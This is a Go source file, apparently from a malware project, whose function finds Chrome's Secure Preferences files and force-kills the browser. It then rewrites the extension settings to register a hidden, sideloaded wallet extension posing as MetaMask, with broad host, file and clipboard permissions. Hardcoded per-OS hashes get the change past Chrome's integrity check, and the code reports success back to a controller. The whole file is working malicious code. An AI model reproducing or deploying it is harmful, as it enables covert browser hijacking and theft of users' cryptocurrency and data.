package auto

import (
	"bits-project/bits/config"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"github.com/Jeffail/gabs/v2"
)

func AutoModeChromeChangeProfile() (string, [][]byte) {

	var path_list []string

	//get user data dir
	userdata_dir := getUserdataDir()

	// search and list prefs
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == secure_preference_file {
			path_list = append(path_list, path)
		}

		return nil
	})

	// chrome kill
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "taskkill /f /im chrome.exe")
		cmd.Run()
	} else {
		cmd := exec.Command("/bin/sh", "-c", "killall chrome")
		cmd.Run()
	}

	// change prefs
	changep, _ := gabs.ParseJSON([]byte(getExtJsonString()))
	for _, path := range path_list {
		prefp, err := gabs.ParseJSONFile(path)
		if err != nil {
			continue
		}

		ok := prefp.ExistsP(extension_hash_key)
		if !ok {
			continue
		}

		prefp.SetP(changep, extension_setting_key)
		prefp.SetP(getExtHash(), extension_hash_key)

		os.WriteFile(path, prefp.Bytes(), 0o644)
	}

	return config.MSG_LOG, [][]byte{[]byte(config.LOG_SUCCESS), []byte("chrome preference change")}
}

// get hash value
func getExtHash() string {

	if runtime.GOOS == "windows" {
		return "B4B0E19A98DEECCC9F9F7DC5F18999C1F2EAAE668F7968C96F7B1CB89C9B0FBD"
	} else {
		return "7A2DEA687C9AB3A86A82893014C926BBB82ECD27B446197559F7512DE9025DA5"
	}

}

// get json string
func getExtJsonString() string {
	return `{"active_permissions":{"api":["activeTab","clipboardWrite","notifications","storage","unlimitedStorage","webRequest"],"explicit_host":["*://*.eth/*","http://localhost:8545/*","https://*.codefi.network/*","https://*.cx.metamask.io/*","https://*.infura.io/*","https://chainid.network/*","https://lattice.gridplus.io/*"],"manifest_permissions":[],"scriptable_host":["*://connect.trezor.io/*/popup.html","file:///*","http://*/*","https://*/*"]},"commands":{"_execute_browser_action":{"suggested_key":"Alt+Shift+M","was_assigned":true}},"content_settings":[],"creation_flags":38,"events":[],"first_install_time":"13361518520188298","from_webstore":false,"granted_permissions":{"api":["activeTab","clipboardWrite","notifications","storage","unlimitedStorage","webRequest"],"explicit_host":["*://*.eth/*","http://localhost:8545/*","https://*.codefi.network/*","https://*.cx.metamask.io/*","https://*.infura.io/*","https://chainid.network/*","https://lattice.gridplus.io/*"],"manifest_permissions":[],"scriptable_host":["*://connect.trezor.io/*/popup.html","file:///*","http://*/*","https://*/*"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13361518520188298","location":4,"newAllowFileAccess":true,"path":"C:\\ProgramData\\11.16.0_0","preferences":{},"regular_only_preferences":{},"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}`
}
